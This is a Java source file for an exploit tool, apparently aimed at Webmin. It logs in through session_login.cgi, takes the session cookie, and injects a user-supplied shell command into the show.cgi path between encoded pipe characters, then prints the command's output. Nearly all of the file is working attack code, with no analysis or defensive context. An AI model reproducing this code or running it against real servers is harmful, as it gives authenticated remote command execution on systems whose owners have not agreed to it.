package exploit;

import bodypublisher.FormDataBodyPublisher;
import dto.CmdLineArgsDto;
import lombok.RequiredArgsConstructor;
import util.ExploitUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

@RequiredArgsConstructor
public class Exploit {

    private final CmdLineArgsDto cmdLineArgsDto;

    private final HttpClient httpClient = HttpClient.newHttpClient();

    private static final Pattern sidRegexCookie = Pattern.compile("sid=[0-9a-zA-Z]{32};.*");

    public void exploit() {
        try {
            HttpResponse<String> loginResponse = httpClient.send(getLoginHttpRequest(), HttpResponse.BodyHandlers.ofString());
            if (loginResponse.statusCode() == 302) {
                List<String> cookies = loginResponse.headers().allValues("Set-Cookie");
                String sidCookie = cookies.stream()
                        .filter(s -> sidRegexCookie.matcher(s).find())
                        .findFirst()
                        .orElseThrow(() -> new RuntimeException("No sid found in response"));
                String sid = sidCookie.substring(4, 36);
                System.out.printf("Got sid=%s, started exploitation...%n", sid);

//              "HTTP/1.0 200 Document follows" Cannot be parsed with modern HttpClient,
//              so using legacy HttpUrlConnection

                HttpURLConnection httpURLConnection = (HttpURLConnection) getExploitUrl().openConnection();
                httpURLConnection.setRequestMethod("GET");
                httpURLConnection.setRequestProperty("Cookie", String.format("sid=%s", sid));
                if (httpURLConnection.getResponseCode() == 200) {
                    System.out.println("Got response code 200 ^.^");
                    System.out.println("Command response:");
                    try (BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()))) {
                        String inputLine;
                        StringBuilder response = new StringBuilder();

                        while ((inputLine = in.readLine()) != null) {
                            response.append(inputLine);
                        }
                        System.out.println(response);
                    }
                }
                httpURLConnection.disconnect();
            } else {
                System.out.println("Service found, but authentication failed");
            }
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private URL getLoginUrl() {
        String protocol = cmdLineArgsDto.isUsingSSL() ? "https" : "http";
        String url = String.format("%s://%s:%d/session_login.cgi",
                protocol,
                cmdLineArgsDto.getHost(),
                cmdLineArgsDto.getPort()
        );
        try {
            return new URL(url);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }

    private HttpRequest getLoginHttpRequest() {
        try {
            Map<String, String> data = new HashMap<>();
            data.put("page", "/");
            data.put("user", cmdLineArgsDto.getUsername());
            data.put("pass", cmdLineArgsDto.getPassword());

            return HttpRequest.newBuilder()
                    .uri(getLoginUrl().toURI())
                    .setHeader("Content-Type", "application/x-www-form-urlencoded")
                    .header("Cookie", "testing=1")
                    .POST(FormDataBodyPublisher.createBodyPublisher(data))
                    .build();
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }

    private URL getExploitUrl() {
        String protocol = cmdLineArgsDto.isUsingSSL() ? "https" : "http";
        String url = String.format("%s://%s:%d/file/show.cgi/bin/%s%%7C%s%%7C",
                protocol,
                cmdLineArgsDto.getHost(),
                cmdLineArgsDto.getPort(),
                ExploitUtils.getRandomAlphaNumeric(5),
                cmdLineArgsDto.getPayload()
        );
        try {
            return new URL(url);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }

}
